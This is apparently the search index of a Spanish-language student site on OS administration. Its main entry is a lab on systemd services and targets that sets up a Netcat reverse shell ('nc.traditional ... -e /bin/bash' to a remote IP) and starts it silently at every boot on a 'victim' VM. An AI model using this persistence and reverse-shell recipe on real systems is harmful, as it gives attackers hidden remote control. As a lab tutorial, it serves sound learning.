{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Administraci\u00f3n de Sistemas Operativos \u00a1Bienvenido/a a mi p\u00e1gina de Administraci\u00f3n de Sistemas Operativos! Aqu\u00ed encontrar\u00e1s proyectos, recursos y documentaci\u00f3n relacionados con la gesti\u00f3n y administraci\u00f3n de sistemas operativos, tanto Linux como Windows. Este espacio est\u00e1 pensado para compartir conocimientos, experiencias y avances en los diferentes proyectos desarrollados en el \u00e1mbito de los sistemas operativos. Explora los contenidos, participa y aprovecha al m\u00e1ximo este repositorio de aprendizaje colaborativo.","title":"Home"},{"location":"#administracion-de-sistemas-operativos","text":"\u00a1Bienvenido/a a mi p\u00e1gina de Administraci\u00f3n de Sistemas Operativos! Aqu\u00ed encontrar\u00e1s proyectos, recursos y documentaci\u00f3n relacionados con la gesti\u00f3n y administraci\u00f3n de sistemas operativos, tanto Linux como Windows. Este espacio est\u00e1 pensado para compartir conocimientos, experiencias y avances en los diferentes proyectos desarrollados en el \u00e1mbito de los sistemas operativos. Explora los contenidos, participa y aprovecha al m\u00e1ximo este repositorio de aprendizaje colaborativo.","title":"Administraci\u00f3n de Sistemas Operativos"},{"location":"LICENSE/","text":"Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0) Este trabajo est\u00e1 licenciado bajo la Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0) . Resumen Esta licencia permite que otros compartan, copien y distribuyan tu trabajo, as\u00ed como adaptarlo o transformarlo, siempre que: Reconozcan la autor\u00eda original. No utilicen el trabajo con fines comerciales. Distribuyan las obras derivadas bajo la misma licencia. Texto legal completo Puedes consultar el texto completo de la licencia aqu\u00ed: https://creativecommons.org/licenses/by-nc-sa/3.0/es/legalcode Atribuci\u00f3n y condiciones Se debe dar cr\u00e9dito adecuado, proporcionar un enlace a esta licencia e indicar si se han realizado cambios. Cualquier obra derivada debe distribuirse con la misma licencia y no se pueden imponer restricciones adicionales. \u00a9 2025 Mireia Consarnau","title":"Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0)"},{"location":"LICENSE/#licencia-creative-commons-reconocimiento-no-comercial-compartir-igual-30-espana-cc-by-nc-sa-30","text":"Este trabajo est\u00e1 licenciado bajo la Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0) .","title":"Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0)"},{"location":"LICENSE/#resumen","text":"Esta licencia permite que otros compartan, copien y distribuyan tu trabajo, as\u00ed como adaptarlo o transformarlo, siempre que: Reconozcan la autor\u00eda original. No utilicen el trabajo con fines comerciales. Distribuyan las obras derivadas bajo la misma licencia.","title":"Resumen"},{"location":"LICENSE/#texto-legal-completo","text":"Puedes consultar el texto completo de la licencia aqu\u00ed: https://creativecommons.org/licenses/by-nc-sa/3.0/es/legalcode","title":"Texto legal completo"},{"location":"LICENSE/#atribucion-y-condiciones","text":"Se debe dar cr\u00e9dito adecuado, proporcionar un enlace a esta licencia e indicar si se han realizado cambios. Cualquier obra derivada debe distribuirse con la misma licencia y no se pueden imponer restricciones adicionales. \u00a9 2025 Mireia Consarnau","title":"Atribuci\u00f3n y condiciones"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada%20amb%20systemd%20L/CreacioEntornsArrancada/","text":"Creaci\u00f3 d'entorns d'arrancada Esta pr\u00e1ctica trata sobre la creaci\u00f3n de servicios ( .service ) y targets ( .target ) en Ubuntu, conceptos fundamentales en la administraci\u00f3n de sistemas y ciberseguridad. Un archivo .service define un servicio gestionado por systemd , como ejecutar autom\u00e1ticamente un script al iniciar el equipo. Por ejemplo, se puede usar para levantar una reverse shell en un entorno de pruebas de ciberseguridad. Un archivo .target agrupa varios servicios y otros targets, permitiendo organizar y controlar el arranque de m\u00faltiples componentes relacionados. El directorio .wants se genera autom\u00e1ticamente por systemd para cada target y contiene enlaces simb\u00f3licos a los servicios que deben iniciarse junto con ese target. As\u00ed, al activar un target, se activan todos los servicios asociados en su .wants . En resumen: los .service definen tareas concretas, los .target agrupan servicios, y los .wants gestionan qu\u00e9 servicios se inician con cada target. .service El siguiente es un ejemplo de archivo .service : Explicaci\u00f3n l\u00ednea por l\u00ednea: [Unit] : Secci\u00f3n donde se describe el prop\u00f3sito del servicio y sus dependencias. Description=Servicio pt1 que ejecuta pt1.sh : Breve descripci\u00f3n del servicio. After=network.target : Indica que el servicio debe iniciarse despu\u00e9s de que la red est\u00e9 disponible. [Service] : Secci\u00f3n principal que define c\u00f3mo se ejecuta el servicio. ExecStart=/usr/local/bin/pt1.sh : Comando que se ejecuta al iniciar el servicio (en este caso, el script pt1.sh ). Restart=always : El servicio se reiniciar\u00e1 autom\u00e1ticamente si se detiene por cualquier motivo. Type=simple : Indica que el servicio se considera activo mientras el proceso principal est\u00e9 en ejecuci\u00f3n. TimeoutStartSec=0 : No hay tiempo de espera para que el servicio arranque; se inicia inmediatamente. [Install] : Secci\u00f3n que define c\u00f3mo y cu\u00e1ndo se activa el servicio. WantedBy=pt1.target : Permite que el servicio se active autom\u00e1ticamente cuando se inicia el target pt1.target . .target El siguiente es un ejemplo de archivo .target : Explicaci\u00f3n l\u00ednea por l\u00ednea: [Unit] : Secci\u00f3n donde se describe el prop\u00f3sito del target y sus dependencias. Description=Target personalizado pt1 : Breve descripci\u00f3n del target. Requires=pt1.service : Indica que este target necesita que el servicio pt1.service est\u00e9 activo. After=network.target : Especifica que este target debe iniciarse despu\u00e9s de que la red est\u00e9 disponible. [Install] : Secci\u00f3n que define c\u00f3mo y cu\u00e1ndo se activa el target. WantedBy=default.target : Permite que el target se active autom\u00e1ticamente al arrancar el sistema, ya que default.target es el objetivo principal de arranque en la mayor\u00eda de sistemas Linux. \u00bfPor qu\u00e9 se genera autom\u00e1ticamente un directorio .target.wants ? Cuando se instala un servicio con la opci\u00f3n WantedBy en su archivo .service , systemd crea autom\u00e1ticamente un directorio llamado .target.wants para el target especificado. Dentro de este directorio, se a\u00f1aden enlaces simb\u00f3licos a los servicios que deben iniciarse junto con ese target. Esto permite que, al activar el target, se ejecuten todos los servicios asociados de forma autom\u00e1tica y ordenada, facilitando la gesti\u00f3n de dependencias y el arranque de componentes relacionados. Se generar\u00e1 autom\u00e1ticamente m\u00e1s adelante, no hace falta crearlo. .script El siguiente es un ejemplo de archivo .sh : Voy a realizar una prueba ejecutando el script manualmente para comprobar si puedo conectarme correctamente al equipo remoto. Esto me permitir\u00e1 verificar que la configuraci\u00f3n y el funcionamiento del script son correctos antes de automatizar el proceso con systemd. Explicaci\u00f3n l\u00ednea por l\u00ednea: SERVER_IP=\"192.168.1.100\" : Define la IP del equipo remoto que recibir\u00e1 la conexi\u00f3n. PORT=4444 : Especifica el puerto en el que el equipo remoto est\u00e1 escuchando. while true; do ... done : Bucle infinito para intentar la conexi\u00f3n continuamente. nc.traditional $SERVER_IP $PORT -e /bin/bash : Usa Netcat para conectar al equipo remoto y ejecutar Bash, proporcionando una shell interactiva. sleep 10 : Si la conexi\u00f3n falla, espera 10 segundos antes de volver a intentarlo. Pasos para aplicar los cambios y activar los servicios autom\u00e1ticamente Recargar la configuraci\u00f3n de systemd: sudo systemctl daemon-reload Habilitar el servicio y el target para que se inicien autom\u00e1ticamente: sudo systemctl enable pt1.service sudo systemctl enable pt1.target Esto crea los enlaces simb\u00f3licos en los directorios .wants correspondientes. Iniciar manualmente el target (opcional, para comprobar que funciona): sudo systemctl start pt1.target Verificar el estado del servicio y del target: systemctl status pt1.service systemctl status pt1.target Con estos pasos, el servicio y el target estar\u00e1n configurados para arrancar autom\u00e1ticamente cada vez que se inicie el sistema. Demostraci\u00f3n en v\u00eddeo A continuaci\u00f3n se muestra un v\u00eddeo donde se reinicia la m\u00e1quina virtual y se verifica que la conexi\u00f3n al equipo remoto se establece autom\u00e1ticamente, gracias a la configuraci\u00f3n realizada con systemd. Este proceso ocurre de manera transparente para el usuario de la m\u00e1quina v\u00edctima, demostrando c\u00f3mo los servicios y targets permiten automatizar tareas en el arranque del sistema sin intervenci\u00f3n manual.","title":"Creaci\u00f3 entorn d\u2019arrencada amb systemd L"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada%20amb%20systemd%20L/CreacioEntornsArrancada/#creacio-dentorns-darrancada","text":"Esta pr\u00e1ctica trata sobre la creaci\u00f3n de servicios ( .service ) y targets ( .target ) en Ubuntu, conceptos fundamentales en la administraci\u00f3n de sistemas y ciberseguridad. Un archivo .service define un servicio gestionado por systemd , como ejecutar autom\u00e1ticamente un script al iniciar el equipo. Por ejemplo, se puede usar para levantar una reverse shell en un entorno de pruebas de ciberseguridad. Un archivo .target agrupa varios servicios y otros targets, permitiendo organizar y controlar el arranque de m\u00faltiples componentes relacionados. El directorio .wants se genera autom\u00e1ticamente por systemd para cada target y contiene enlaces simb\u00f3licos a los servicios que deben iniciarse junto con ese target. As\u00ed, al activar un target, se activan todos los servicios asociados en su .wants . En resumen: los .service definen tareas concretas, los .target agrupan servicios, y los .wants gestionan qu\u00e9 servicios se inician con cada target.","title":"Creaci\u00f3 d'entorns d'arrancada"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada%20amb%20systemd%20L/CreacioEntornsArrancada/#service","text":"El siguiente es un ejemplo de archivo .service : Explicaci\u00f3n l\u00ednea por l\u00ednea: [Unit] : Secci\u00f3n donde se describe el prop\u00f3sito del servicio y sus dependencias. Description=Servicio pt1 que ejecuta pt1.sh : Breve descripci\u00f3n del servicio. After=network.target : Indica que el servicio debe iniciarse despu\u00e9s de que la red est\u00e9 disponible. [Service] : Secci\u00f3n principal que define c\u00f3mo se ejecuta el servicio. ExecStart=/usr/local/bin/pt1.sh : Comando que se ejecuta al iniciar el servicio (en este caso, el script pt1.sh ). Restart=always : El servicio se reiniciar\u00e1 autom\u00e1ticamente si se detiene por cualquier motivo. Type=simple : Indica que el servicio se considera activo mientras el proceso principal est\u00e9 en ejecuci\u00f3n. TimeoutStartSec=0 : No hay tiempo de espera para que el servicio arranque; se inicia inmediatamente. [Install] : Secci\u00f3n que define c\u00f3mo y cu\u00e1ndo se activa el servicio. WantedBy=pt1.target : Permite que el servicio se active autom\u00e1ticamente cuando se inicia el target pt1.target .","title":".service"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada%20amb%20systemd%20L/CreacioEntornsArrancada/#target","text":"El siguiente es un ejemplo de archivo .target : Explicaci\u00f3n l\u00ednea por l\u00ednea: [Unit] : Secci\u00f3n donde se describe el prop\u00f3sito del target y sus dependencias. Description=Target personalizado pt1 : Breve descripci\u00f3n del target. Requires=pt1.service : Indica que este target necesita que el servicio pt1.service est\u00e9 activo. After=network.target : Especifica que este target debe iniciarse despu\u00e9s de que la red est\u00e9 disponible. [Install] : Secci\u00f3n que define c\u00f3mo y cu\u00e1ndo se activa el target. WantedBy=default.target : Permite que el target se active autom\u00e1ticamente al arrancar el sistema, ya que default.target es el objetivo principal de arranque en la mayor\u00eda de sistemas Linux.","title":".target"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada%20amb%20systemd%20L/CreacioEntornsArrancada/#por-que-se-genera-automaticamente-un-directorio-targetwants","text":"Cuando se instala un servicio con la opci\u00f3n WantedBy en su archivo .service , systemd crea autom\u00e1ticamente un directorio llamado .target.wants para el target especificado. Dentro de este directorio, se a\u00f1aden enlaces simb\u00f3licos a los servicios que deben iniciarse junto con ese target. Esto permite que, al activar el target, se ejecuten todos los servicios asociados de forma autom\u00e1tica y ordenada, facilitando la gesti\u00f3n de dependencias y el arranque de componentes relacionados. Se generar\u00e1 autom\u00e1ticamente m\u00e1s adelante, no hace falta crearlo.","title":"\u00bfPor qu\u00e9 se genera autom\u00e1ticamente un directorio .target.wants?"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada%20amb%20systemd%20L/CreacioEntornsArrancada/#script","text":"El siguiente es un ejemplo de archivo .sh : Voy a realizar una prueba ejecutando el script manualmente para comprobar si puedo conectarme correctamente al equipo remoto. Esto me permitir\u00e1 verificar que la configuraci\u00f3n y el funcionamiento del script son correctos antes de automatizar el proceso con systemd. Explicaci\u00f3n l\u00ednea por l\u00ednea: SERVER_IP=\"192.168.1.100\" : Define la IP del equipo remoto que recibir\u00e1 la conexi\u00f3n. PORT=4444 : Especifica el puerto en el que el equipo remoto est\u00e1 escuchando. while true; do ... done : Bucle infinito para intentar la conexi\u00f3n continuamente. nc.traditional $SERVER_IP $PORT -e /bin/bash : Usa Netcat para conectar al equipo remoto y ejecutar Bash, proporcionando una shell interactiva. sleep 10 : Si la conexi\u00f3n falla, espera 10 segundos antes de volver a intentarlo.","title":".script"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada%20amb%20systemd%20L/CreacioEntornsArrancada/#pasos-para-aplicar-los-cambios-y-activar-los-servicios-automaticamente","text":"Recargar la configuraci\u00f3n de systemd: sudo systemctl daemon-reload Habilitar el servicio y el target para que se inicien autom\u00e1ticamente: sudo systemctl enable pt1.service sudo systemctl enable pt1.target Esto crea los enlaces simb\u00f3licos en los directorios .wants correspondientes. Iniciar manualmente el target (opcional, para comprobar que funciona): sudo systemctl start pt1.target Verificar el estado del servicio y del target: systemctl status pt1.service systemctl status pt1.target Con estos pasos, el servicio y el target estar\u00e1n configurados para arrancar autom\u00e1ticamente cada vez que se inicie el sistema.","title":"Pasos para aplicar los cambios y activar los servicios autom\u00e1ticamente"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada%20amb%20systemd%20L/CreacioEntornsArrancada/#demostracion-en-video","text":"A continuaci\u00f3n se muestra un v\u00eddeo donde se reinicia la m\u00e1quina virtual y se verifica que la conexi\u00f3n al equipo remoto se establece autom\u00e1ticamente, gracias a la configuraci\u00f3n realizada con systemd. Este proceso ocurre de manera transparente para el usuario de la m\u00e1quina v\u00edctima, demostrando c\u00f3mo los servicios y targets permiten automatizar tareas en el arranque del sistema sin intervenci\u00f3n manual.","title":"Demostraci\u00f3n en v\u00eddeo"}]}